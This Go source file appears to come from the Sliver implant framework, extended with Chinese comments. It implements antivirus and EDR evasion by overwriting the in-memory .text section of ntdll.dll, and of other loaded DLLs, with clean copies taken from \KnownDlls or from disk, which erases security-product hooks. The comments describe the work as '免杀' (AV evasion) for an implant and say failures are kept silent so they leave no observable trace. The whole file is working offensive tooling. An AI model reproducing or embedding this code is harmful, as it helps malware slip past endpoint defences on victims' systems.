package evasion

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"errors"
	"fmt"
	"path/filepath"

	"golang.org/x/sys/windows"

	//{{if .Config.Debug}}
	"log"
	//{{end}}
	"debug/pe"
	"unsafe"
)

// RefreshPE reloads a DLL from disk into the current process
// in an attempt to erase AV or EDR hooks placed at runtime.
func RefreshPE(name string) error {
	//{{if .Config.Debug}}
	log.Printf("Reloading %s...\n", name)
	//{{end}}
	f, e := pe.Open(name)
	if e != nil {
		return e
	}

	x := f.Section(".text")
	ddf, e := x.Data()
	if e != nil {
		return e
	}
	return writeGoodBytes(ddf, name, x.VirtualAddress, x.Name, x.VirtualSize)
}

func writeGoodBytes(b []byte, pn string, virtualoffset uint32, secname string, vsize uint32) error {
	t, e := windows.LoadDLL(pn)
	if e != nil {
		return e
	}
	h := t.Handle
	dllBase := uintptr(h)

	dllOffset := uint(dllBase) + uint(virtualoffset)

	var old uint32
	e = windows.VirtualProtect(uintptr(dllOffset), uintptr(vsize), windows.PAGE_EXECUTE_READWRITE, &old)
	if e != nil {
		return e
	}
	//{{if .Config.Debug}}
	log.Println("Made memory map RWX")
	//{{end}}

	// vsize should always smaller than len(b)
	for i := 0; i < int(vsize); i++ {
		loc := uintptr(dllOffset + uint(i))
		mem := (*[1]byte)(unsafe.Pointer(loc))
		(*mem)[0] = b[i]
	}

	//{{if .Config.Debug}}
	log.Println("DLL overwritten")
	//{{end}}
	e = windows.VirtualProtect(uintptr(dllOffset), uintptr(vsize), old, &old)
	if e != nil {
		return e
	}
	//{{if .Config.Debug}}
	log.Println("Restored memory map permissions")
	//{{end}}
	return nil
}

// UnhookNtdll —— 启动早期 ntdll 自恢复（免杀 R-2 v1，方案：
// docs/运行时免杀R组实施方案-SleepCrypt与Unhooking.md §二·R-2）：
// 从磁盘 System32\ntdll.dll 读取 .text 覆盖内存节，抹平 EDR 写入的用户态 hook。
// 守卫：磁盘节与内存节的 .text VirtualSize 不一致（补丁版本失配）即放弃，防越界写崩；
// 任何失败静默返回（调用方 recover 兜底），不产生可观测行为差异。
// 已知边界：EDR 对 ntdll .text 有完整性校验时本动作自身可触发告警（上位文档 R-2 风险条款）。
// UnhookNtdll —— 启动早期 ntdll 自恢复（免杀 R-2 v1 + R-2.2，方案：
// docs/运行时免杀R组实施方案-SleepCrypt与Unhooking.md §二·R-2）：
// 干净 .text 来源优先级：① \KnownDlls\ntdll.dll section 映射（R-2.2，无磁盘读取
// 痕迹——对象管理器启动时已以 SEC_IMAGE 映射，内容即内核加载的原始映像）；
// ② System32 磁盘文件回退（R-2 v1）。两路均做 size 对账（补丁版本失配即放弃，
// 防越界写崩）；任何失败静默返回（调用方 recover 兜底），不产生可观测行为差异。
func UnhookNtdll() error {
	clean, cleanSize, err := unhookFromKnownDlls()
	if err != nil {
		clean, cleanSize, err = unhookFromDisk()
	}
	if err != nil {
		return err
	}

	dll, err := windows.LoadDLL("ntdll.dll") // ntdll 已加载 → 返回现有模块基址
	if err != nil {
		return err
	}
	base := uintptr(dll.Handle)

	memVA, memSize, ok := imageSectionInfo(base, ".text")
	if !ok {
		return errors.New("evasion: memory ntdll .text not found")
	}
	if memSize != cleanSize {
		// 内存与干净映像版本失配：放弃覆盖（防越界写崩），交由调用方静默
		return errors.New("evasion: ntdll version mismatch, skip unhook")
	}

	var old uint32
	dst := base + uintptr(memVA)
	if err = windows.VirtualProtect(dst, uintptr(memSize), windows.PAGE_EXECUTE_READWRITE, &old); err != nil {
		return err
	}
	// RtlMoveMemory 拷贝干净 .text → 内存 .text（size 已对账，无越界）
	procRtlMoveMemory.Call(dst, uintptr(unsafe.Pointer(&clean[0])), uintptr(memSize))
	return windows.VirtualProtect(dst, uintptr(memSize), old, &old)
}

// unhookFromKnownDlls 经 \KnownDlls\ntdll.dll section 映射取干净 .text（R-2.2）。
func unhookFromKnownDlls() ([]byte, uint32, error) {
	sectionPath := `\KnownDlls\ntdll.dll`
	ustr := ntUnicodeString{
		Length:        uint16(len(sectionPath) * 2),
		MaximumLength: uint16(len(sectionPath)*2 + 2),
		Buffer:        uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(sectionPath))),
	}
	objAttr := ntObjectAttributes{
		Length:     uint32(unsafe.Sizeof(ntObjectAttributes{})),
		Attributes: ntObjCaseInsensitive,
		ObjectName: &ustr,
	}
	var hSection uintptr
	secStatus, _, _ := procNtCreateSection.Call(
		uintptr(unsafe.Pointer(&hSection)),
		uintptr(ntSectionMapRead|ntSectionMapExecute),
		uintptr(unsafe.Pointer(&objAttr)),
		0,                       // MaximumSize（映射已存在 section 时忽略）
		uintptr(ntPageReadOnly), // Protection
		uintptr(ntSecImage),     // AllocationAttributes: SEC_IMAGE
		0,                       // FileHandle（KnownDlls 命名 section 无需）
	)
	if secStatus != 0 {
		return nil, 0, fmt.Errorf("evasion: NtCreateSection ntstatus=0x%x", secStatus)
	}
	defer windows.CloseHandle(windows.Handle(hSection))

	var base uintptr
	var viewSize uintptr
	mapStatus, _, _ := procNtMapViewOfSection.Call(
		hSection,
		uintptr(ntCurrentProcess),
		uintptr(unsafe.Pointer(&base)),
		0, // ZeroBits
		0, // CommitSize
		0, // SectionOffset
		uintptr(unsafe.Pointer(&viewSize)),
		uintptr(ntViewShare),
		0, // AllocationType
		uintptr(ntPageReadOnly),
	)
	if mapStatus != 0 {
		return nil, 0, fmt.Errorf("evasion: NtMapViewOfSection ntstatus=0x%x", mapStatus)
	}
	defer procNtUnmapViewOfSection.Call(uintptr(ntCurrentProcess), base)

	va, vsize, ok := imageSectionInfo(base, ".text")
	if !ok || vsize == 0 {
		return nil, 0, errors.New("evasion: knownDlls ntdll .text not found")
	}
	clean := make([]byte, vsize)
	copy(clean, unsafe.Slice((*byte)(unsafe.Pointer(base+uintptr(va))), uintptr(vsize)))
	return clean, vsize, nil
}

// unhookFromDisk 磁盘回退（R-2 v1）：System32\ntdll.dll 读取 .text。
// 边界：部分 EDR 监控对 ntdll.dll 文件的打开动作——故仅作 KnownDlls 失败时的回退。
func unhookFromDisk() ([]byte, uint32, error) {
	sysDir, err := windows.GetSystemDirectory()
	if err != nil {
		return nil, 0, err
	}
	diskPath := filepath.Join(sysDir, "ntdll.dll")

	f, err := pe.Open(diskPath)
	if err != nil {
		return nil, 0, err
	}
	defer f.Close()
	diskSec := f.Section(".text")
	if diskSec == nil {
		return nil, 0, errors.New("evasion: disk ntdll has no .text section")
	}
	diskData, err := diskSec.Data()
	if err != nil {
		return nil, 0, err
	}
	if diskSec.VirtualSize == 0 || uint64(len(diskData)) < uint64(diskSec.VirtualSize) {
		return nil, 0, errors.New("evasion: disk .text raw data smaller than virtual size")
	}
	return diskData[:diskSec.VirtualSize], diskSec.VirtualSize, nil
}

// imageSectionInfo 解析内存 PE 头，返回指定节的 VirtualAddress/VirtualSize。
func imageSectionInfo(base uintptr, want string) (va, vsize uint32, ok bool) {
	// DOS header: e_lfanew @ 0x3C
	eLfanew := *(*uint32)(unsafe.Pointer(base + 0x3C))
	// FileHeader: NumberOfSections @ e_lfanew+6, SizeOfOptionalHeader @ e_lfanew+20
	numSections := *(*uint16)(unsafe.Pointer(base + uintptr(eLfanew) + 6))
	sizeOpt := *(*uint16)(unsafe.Pointer(base + uintptr(eLfanew) + 20))
	secTable := base + uintptr(eLfanew) + 24 + uintptr(sizeOpt)
	for i := uint16(0); i < numSections; i++ {
		p := secTable + uintptr(i)*40 // IMAGE_SECTION_HEADER 固定 40 字节
		name := (*[8]byte)(unsafe.Pointer(p))
		if name[0] == '.' && name[1] == 't' && name[2] == 'e' && name[3] == 'x' && name[4] == 't' {
			return *(*uint32)(unsafe.Pointer(p + 12)), *(*uint32)(unsafe.Pointer(p + 8)), true
		}
	}
	return 0, 0, false
}

var ntdll = windows.NewLazyDLL("ntdll.dll")

var (
	procRtlMoveMemory        = ntdll.NewProc("RtlMoveMemory")
	procNtCreateSection      = ntdll.NewProc("NtCreateSection")
	procNtMapViewOfSection   = ntdll.NewProc("NtMapViewOfSection")
	procNtUnmapViewOfSection = ntdll.NewProc("NtUnmapViewOfSection")
)

// NT 原生接口（R-2.2 KnownDlls section 映射）：x64 结构与常量。
type ntUnicodeString struct {
	Length        uint16
	MaximumLength uint16
	Buffer        uintptr
}

type ntObjectAttributes struct {
	Length                   uint32
	RootDirectory            uintptr
	ObjectName               *ntUnicodeString
	Attributes               uint32
	SecurityDescriptor       uintptr
	SecurityQualityOfService uintptr
}

const (
	ntCurrentProcess     = ^uintptr(0) // (HANDLE)-1
	ntSectionMapRead     = 0x0004
	ntSectionMapExecute  = 0x0008
	ntObjCaseInsensitive = 0x0040
	ntSecImage           = 0x1000000
	ntViewShare          = 1
	ntPageReadOnly       = 0x02
)
